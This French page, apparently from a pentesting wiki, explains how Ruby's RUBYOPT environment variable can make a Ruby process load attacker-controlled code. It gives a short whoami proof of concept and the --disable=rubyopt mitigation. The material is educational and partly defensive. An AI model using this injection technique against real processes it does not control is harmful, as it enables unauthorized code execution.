# Injection dans les applications Ruby

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analyse les options de ligne de commande prises en charge depuis la variable d'environnement `RUBYOPT` avant d'exécuter un script. Ruby refuse l'exécution de code via `-e` dans `RUBYOPT`, mais `-I` peut ajouter un répertoire de recherche de bibliothèques et `-r` peut charger une bibliothèque. Un processus qui lance Ruby avec des variables d'environnement contrôlées par un attaquant peut donc être amené à charger du code Ruby contrôlé par l'attaquant.<sup>[[1]](#references)</sup>

Créez `/tmp/inject.rb` :
```ruby:inject.rb
puts `whoami`
```
Créez un script Ruby inoffensif tel que `hello.rb` :
```ruby:hello.rb
puts 'Hello, World!'
```
Exécutez-le avec une valeur `RUBYOPT` contrôlée :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Pour désactiver ce comportement, passez `--disable=rubyopt` (ou `--disable-rubyopt`) **avant** le nom du script :<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Une option écrite après `hello.rb` est transmise au script dans `ARGV` ; elle ne désactive pas le traitement préalable par Ruby de `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Documentation Ruby - Options de ligne de commande de Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
